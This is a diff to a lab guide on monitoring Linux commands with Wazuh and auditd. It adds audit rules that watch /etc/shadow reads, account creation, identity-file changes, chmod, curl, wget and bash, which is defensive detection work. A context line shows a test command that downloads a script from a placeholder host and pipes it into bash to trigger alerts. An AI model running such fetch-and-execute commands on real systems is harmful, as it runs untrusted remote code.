@@ -35,6 +35,27 @@ For this lab we are using custom rules file to monitore all the commands execute
     ```
     -a always,exit -F arch=b64 -S execve -S execveat -F euid=0 -k audit-wazuh-c
     -a always,exit -F arch=b32 -S execve -S execveat -F euid=0 -k audit-wazuh-c
+
+    # Monitor sensitive credential access
+    -w /etc/shadow -p r -k audit-wazuh-c
+
+    # Monitor user creation
+    -w /usr/sbin/useradd -p x -k audit-wazuh-c
+
+    # Monitor identity file modifications
+    -w /etc/passwd -p wa -k audit-wazuh-c
+    -w /etc/group -p wa -k audit-wazuh-c
+
+    # Monitor permission changes
+    -w /usr/bin/chmod -p x -k audit-wazuh-c
+
+    # Monitor remote downloads
+    -w /usr/bin/curl -p x -k audit-wazuh-c
+    -w /usr/bin/wget -p x -k audit-wazuh-c
+
+    # Monitor shell execution
+    -w /bin/bash -p x -k audit-wazuh-c
+
     ```
     - add audtid log file to ossec.conf. The log file used here is at "/var/log/audit/audit.log"<br>
     ```
@@ -70,5 +91,6 @@ curl http://example.com/malware.sh | bash
     - under agent -> Security events, you will find all the above commands alerts mapped to rule_id, mitre attack TTPs and other details.
 
     - Refernce Image:
-        - [auditd events](../images/auditd%20evetns.png)
+        - [custom rules](../images/agent-audit-custom-rules.png)
+        - [auditd events](../images/auditd-events.png)
         
